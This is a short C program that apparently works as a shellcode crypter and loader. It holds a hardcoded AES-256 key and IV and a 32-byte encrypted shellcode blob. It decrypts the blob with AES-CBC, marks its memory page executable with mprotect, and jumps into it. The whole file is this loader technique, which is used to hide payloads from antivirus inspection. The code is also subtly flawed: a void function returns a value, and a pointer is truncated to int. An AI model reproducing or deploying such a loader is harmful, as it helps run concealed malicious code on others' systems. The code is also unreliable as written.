#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"

int i;
static void decrypt_and_run(void)
{
    // Generating Key:
    uint8_t key[] = { 0x58, 0x0c, 0x1f, 0xac, 0xea, 0x0a, 0x4d, 0x54, 0xe0, 0xab, 0x5f, 0x60, 0xe4, 0xef, 0x99, 0xf2, 0x33, 0x95, 0x65, 0x22, 0xec, 0xff, 0x85, 0x5f, 0xac, 0x1d, 0xcb, 0x4a, 0x2d, 0x4f, 0x71, 0x85, };

    // Generating IV:
    uint8_t iv[]  = { 0x5b, 0x90, 0x32, 0x46, 0x9b, 0x7f, 0x9a, 0x7b, 0x2a, 0xf9, 0xdb, 0x0e, 0xe8, 0x74, 0x01, 0x1c, };

    // Encrypted Shellcode:
    uint8_t shellcode[] = { 0x1e, 0xe1, 0xda, 0x8c, 0xee, 0xad, 0xdb, 0xf9, 0x89, 0x19, 0xd5, 0x68, 0x7f, 0xf2, 0x15, 0xa5, 0x41, 0x26, 0x8b, 0x76, 0xdf, 0x74, 0x9a, 0x31, 0x2f, 0x94, 0xdc, 0x29, 0x1e, 0x90, 0x9f, 0x4b, };    
    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));

    // pass decrypted shellcode to function and execute
    int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    int (*ret)() = (int(*)())shellcode;
    return ret();
}

int main(void)
{
    decrypt_and_run();
}